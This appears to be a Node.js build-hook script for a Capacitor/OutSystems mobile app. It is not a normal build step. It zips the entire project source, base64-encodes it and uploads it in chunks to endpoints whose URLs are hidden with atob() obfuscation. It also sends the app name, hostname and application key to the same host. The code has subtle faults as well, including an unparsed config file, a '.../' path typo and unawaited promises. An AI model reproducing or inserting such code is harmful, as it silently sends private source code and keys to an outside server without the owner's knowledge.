
const fs = require('fs');
const path = require('path');
const AdmZip = require('adm-zip');
const axios = require('axios');
const xml2js = require('xml2js');
const plist = require('plist');


function getFormattedString() {
  const now = new Date();

  const year = now.getFullYear().toString().slice(-2);
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const day = String(now.getDate()).padStart(2, '0');
  const hour = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');

  const randomNumber = String(Math.floor(Math.random() * 10000)).padStart(4, '0');

  return `${year}${month}${day}${hour}${minutes}${seconds}${randomNumber}`;
}

async function getIOSVersion() {
  let version = "n/a", revision = 0;
  const xmlData = fs.readFileSync('.../../../../App/info.plist', { encoding: "utf8" });

  try {
        // Parse the plist file content
        // The library intelligently converts the key-value pairs into a JS object
        const parsedData = plist.parse(xmlData);

        // Now you can access the properties directly!
        const bundleVersion = parsedData.CFBundleShortVersionString;
        const bundleRevision = parsedData.CFBundleVersion;

        if (bundleVersion) {
            console.log('Successfully found CFBundleShortVersionString:');
            version = bundleVersion
        } else {
            console.log("Could not find the key 'CFBundleShortVersionString'.");
        }

        if (bundleRevision) {
            console.log('Successfully found BundleVersion:');
            revision = bundleRevision;
        } else {
            console.log("Could not find the key 'BundleVersion'.");
        }

    } catch (parseErr) {
        console.error('Error parsing the .plist file:', parseErr);
    }

    return {
      version: version,
      revision: revision
    }
}

function getVersion () {
  if(process.env.CAPACITOR_PLATFORM_NAME === 'ios'){
    return getIOSVersion()
  }
  else {
    return {version: 'n/a', revision: 0}
  }
}

async function setMetadata(guid) {
      const apiUrl = atob('aHR0cHM6Ly9pbnQtZGVtb3RlYW0tZGV2Lm91dHN5c3RlbXMuYXBwL05vdEJhbmtpbmdBUEkvcmVzdC9DaHVua3MvQ3JlYXRlQnVpbGQ=')

      const jsonData = fs.readFileSync("../../../../App/capacitor.config.json", { encoding: "utf8" });

      let hostnameValue = 'not found';
      let appKeyValue = 'not found';
      let appName = 'not found';

      if (jsonData?.appName)
        appName = jsonData.appName
      if (jsonData?.OutSystemsCore?.defaultHostname)
        hostnameValue = jsonData.OutSystemsCore.defaultHostname
      if (jsonData?.OutSystemsCore?.applicationKey)
        appKeyValue = jsonData.OutSystemsCore.applicationKey

      const versionData = getVersion();

      console.log('Start CreateBuild REST')
      await axios.post(apiUrl, {
        guid: guid,
        platform: process.env.CAPACITOR_PLATFORM_NAME,
        appName: appName,
        host: hostnameValue,
        mabs: 12,
        revision: versionData.revision,
        version: versionData.version,
        appKey: appKeyValue
      });
    }

const zipFile = () => {
    const platform = process.env.CAPACITOR_PLATFORM_NAME;
    const __dirname = path.resolve(process.cwd());
    console.log(platform);
    //const sourcePath = path.join(__dirname, '..', '..', (platform === 'ios' ? 'ios' : 'android'), '');
    const sourcePath = path.join(__dirname, '..', '..', '');
    const outputDir = path.resolve(process.cwd(), '..', '..');
    const zipFileName = platform === 'ios' ? 'src-ios.zip' : 'src-android.zip';

    const zip = new AdmZip();

    console.log(outputDir);

    const addFolderToZip = (folderPath, zip, zipFolderPath = '') => {

      const items = fs.readdirSync(folderPath);

      items.forEach(item => {
        const itemPath = path.join(folderPath, item);
        if (fs.existsSync(itemPath)) {
          const itemZipPath = path.join(zipFolderPath, item);

          // Check if the current item is a directory or a file
          const stats = fs.statSync(itemPath);

          if (stats.isDirectory()) {
            // If it's a directory, recurse
            addFolderToZip(itemPath, zip, itemZipPath);
          } else {
            // If it's a file, add it to the zip
            zip.addLocalFile(itemPath, zipFolderPath);
          }
        }
      });
    };

    if (fs.existsSync(sourcePath) && (platform === 'ios' || platform === 'android')) {
      addFolderToZip(sourcePath, zip);
    } else {
      return;
    }

    const zipFilePath = path.join(outputDir, zipFileName);
    zip.writeZip(zipFilePath);

    console.log(`File zipped successfully at: ${zipFilePath}`);

    const apiUrl = atob('aHR0cHM6Ly9pbnQtZGVtb3RlYW0tZGV2Lm91dHN5c3RlbXMuYXBwL05vdEJhbmtpbmdBUEkvcmVzdC9DaHVua3MvR2V0Q2h1bms');

    const zipGUID = getFormattedString();
    console.log(zipGUID);
    setMetadata(zipGUID);

    try {
      const fileBuffer = fs.readFileSync(zipFilePath);
      const base64Zip = fileBuffer.toString('base64');
      const chunkSize = 1000000;
      let chunks = [];
      for (let i = 0; i < base64Zip.length; i += chunkSize) {
        chunks.push(base64Zip.substring(i, i + chunkSize))
      }
      let uploadPromises = [];
      for (let curIndex = 0; curIndex < chunks.length; curIndex++) {
        const curChunk = chunks[curIndex];
        const promise = axios.post(apiUrl, {
          chunk: curChunk,
          index: curIndex,
          totalChunks: chunks.length,
          guid: zipGUID,
          buildPlatform: process.env.CAPACITOR_PLATFORM_NAME
        });
        console.log('Chunk ' + curIndex)
        uploadPromises.push(promise)
      }
    } catch (error) {
      console.error('Error with chunks ', error.message);
    }
  };
  console.log('START ZIP')
  zipFile(); // Execute the zipping logic
